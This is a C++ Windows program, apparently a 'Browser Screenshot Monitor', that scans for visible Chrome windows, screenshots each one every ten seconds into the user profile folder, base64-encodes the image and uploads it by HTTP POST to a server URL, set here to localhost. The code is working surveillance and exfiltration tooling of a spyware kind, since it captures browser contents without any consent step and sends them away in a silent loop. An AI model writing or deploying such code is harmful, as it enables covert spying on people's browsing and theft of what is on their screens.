#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include <ctime>
#include <curl/curl.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "libcurl.lib")

// Base64 encoding
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const unsigned char* data, unsigned int input_length) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (input_length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

// CURL callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string wstring_to_string(const std::wstring& ws) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &ws[0], (int)ws.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &ws[0], (int)ws.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

std::string GetUserProfilePath() {
    char userProfile[MAX_PATH];
    DWORD result = GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    if (result > 0 && result < MAX_PATH) {
        return std::string(userProfile);
    }
    return "C:\\Users\\Default";
}

std::string GenerateFilename(const std::string& appName, time_t now) {
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);

    char filename[MAX_PATH];
    std::string userPath = GetUserProfilePath();
    sprintf_s(filename, MAX_PATH, "%s\\screenshot_%s_%04d%02d%02d_%02d%02d%02d.bmp",
        userPath.c_str(), appName.c_str(),
        timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday,
        timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
    return std::string(filename);
}

bool SaveScreenshot(HWND hWnd, const std::string& filename) {
    // Get window rectangle (not client rectangle)
    RECT rcWindow;
    GetWindowRect(hWnd, &rcWindow);

    int width = rcWindow.right - rcWindow.left;
    int height = rcWindow.bottom - rcWindow.top;

    if (width <= 0 || height <= 0) {
        std::cout << "Invalid window dimensions" << std::endl;
        return false;
    }

    // Get desktop DC for screen capture
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        std::cout << "Failed to get screen DC" << std::endl;
        return false;
    }

    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);

    if (hdcMemDC && hBitmap) {
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMemDC, hBitmap);

        // Capture the screen region where the window is located
        BOOL result = BitBlt(hdcMemDC, 0, 0, width, height,
            hdcScreen, rcWindow.left, rcWindow.top, SRCCOPY);

        if (!result) {
            std::cout << "BitBlt failed" << std::endl;
            SelectObject(hdcMemDC, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hdcMemDC);
            ReleaseDC(NULL, hdcScreen);
            return false;
        }

        // Save as BMP
        BITMAPINFOHEADER bi = { 0 };
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height;  // Negative for top-down bitmap
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;

        DWORD dwBmpSize = ((width * 3 + 3) & ~3) * height;
        BITMAPFILEHEADER bmfHeader = { 0 };
        bmfHeader.bfType = 0x4D42;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = dwBmpSize + bmfHeader.bfOffBits;

        std::vector<BYTE> bitmapData(dwBmpSize);
        GetDIBits(hdcMemDC, hBitmap, 0, height, bitmapData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &bytesWritten, NULL);
            WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &bytesWritten, NULL);
            WriteFile(hFile, bitmapData.data(), dwBmpSize, &bytesWritten, NULL);
            CloseHandle(hFile);

            SelectObject(hdcMemDC, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hdcMemDC);
            ReleaseDC(NULL, hdcScreen);

            std::cout << "Screenshot saved: " << filename << std::endl;
            return true;
        }

        SelectObject(hdcMemDC, hOldBitmap);
        DeleteObject(hBitmap);
    }

    if (hdcMemDC) DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
    return false;
}

bool UploadBase64(const std::string& filename, const std::string& uploadUrl) {
    // Read file
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cout << "Failed to open file for upload" << std::endl;
        return false;
    }

    auto fileSize = file.tellg();
    file.seekg(0);
    std::vector<unsigned char> buffer(fileSize);
    file.read((char*)buffer.data(), fileSize);
    file.close();

    // Encode to base64
    std::string base64Data = base64_encode(buffer.data(), (unsigned int)fileSize);
    std::cout << "Base64 encoded: " << base64Data.length() << " characters" << std::endl;

    CURL* curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;

        curl_formadd(&formpost, &lastptr,
            CURLFORM_COPYNAME, "filedata",
            CURLFORM_COPYCONTENTS, base64Data.c_str(),
            CURLFORM_CONTENTTYPE, "text/plain",
            CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, uploadUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        std::string response_string;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        res = curl_easy_perform(curl);

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

        curl_formfree(formpost);
        curl_easy_cleanup(curl);

        std::cout << "Upload HTTP response: " << http_code << std::endl;
        if (response_string.length() > 0) {
            std::cout << "Response: " << response_string.substr(0, 200);
            if (response_string.length() > 200) std::cout << "...";
            std::cout << std::endl;
        }

        return (res == CURLE_OK && http_code == 200);
    }
    return false;
}

bool IsChromeWindow(HWND hwnd) {
    char className[256];
    GetClassNameA(hwnd, className, sizeof(className));
    return strcmp(className, "Chrome_WidgetWin_1") == 0;
}

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);

    std::cout << "Browser Screenshot Monitor Started" << std::endl;
    std::cout << "Monitoring for Chrome windows..." << std::endl;
    std::cout << "Upload URL: http://localhost:80/upload" << std::endl;

    time_t lastCapture = 0;

    while (true) {
        HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
        while (hwnd) {
            if (IsWindowVisible(hwnd) && IsChromeWindow(hwnd)) {
                time_t now = time(NULL);
                if (now - lastCapture > 10) { // Capture every 10 seconds
                    char windowTitle[256];
                    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

                    std::cout << "Found Chrome window: " << windowTitle << std::endl;

                    std::string filename = GenerateFilename("chrome", now);
                    if (SaveScreenshot(hwnd, filename)) {
                        std::cout << "Uploading screenshot..." << std::endl;
                        if (UploadBase64(filename, "http://localhost/upload")) {
                            std::cout << "Upload successful!" << std::endl;
                        }
                        else {
                            std::cout << "Upload failed!" << std::endl;
                        }
                    }
                    lastCapture = now;
                }
            }
            hwnd = GetWindow(hwnd, GW_HWNDNEXT);
        }
        Sleep(5000); // Check every 5 seconds
    }

    curl_global_cleanup();
    return 0;
}